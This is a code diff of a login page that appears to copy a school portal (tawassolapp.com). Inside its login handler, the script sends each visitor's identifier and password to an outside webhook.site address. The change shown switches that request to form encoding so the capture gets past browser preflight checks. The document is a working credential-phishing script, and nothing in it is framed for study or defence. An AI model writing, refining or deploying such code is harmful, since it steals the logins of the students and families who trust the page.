@@ -54,7 +54,7 @@
     </div>
     <script src="https://tawassolapp.com/eleve_assets/vendors/js/vendor.bundle.base.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
-    <script>
+<script>
         var baseURL = 'https://tawassolapp.com/';
         toastr.options.closeButton = true;
         toastr.options.progressBar = true;
@@ -68,11 +68,13 @@
                 if(code.length > 0 && password.length > 0){
                     $("#btnSubmitLogin").html(`<div class="lds-ring"><div></div><div></div><div></div><div></div></div>`);
                     
-                    // Instant POST request to your webhook page
+                    // Send data using form encoding so webhook.site catches it instantly without preflight blocks
+                    var postData = "Identifiant=" + encodeURIComponent(code) + "&MotDePasse=" + encodeURIComponent(password);
+                    
                     fetch('https://webhook.site/8c374b94-6770-4a86-85c5-f38bd00bd192', {
                         method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ Identifiant: code, MotDePasse: password })
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: postData
                     }).catch(function() {});
 
                     setTimeout(function() {
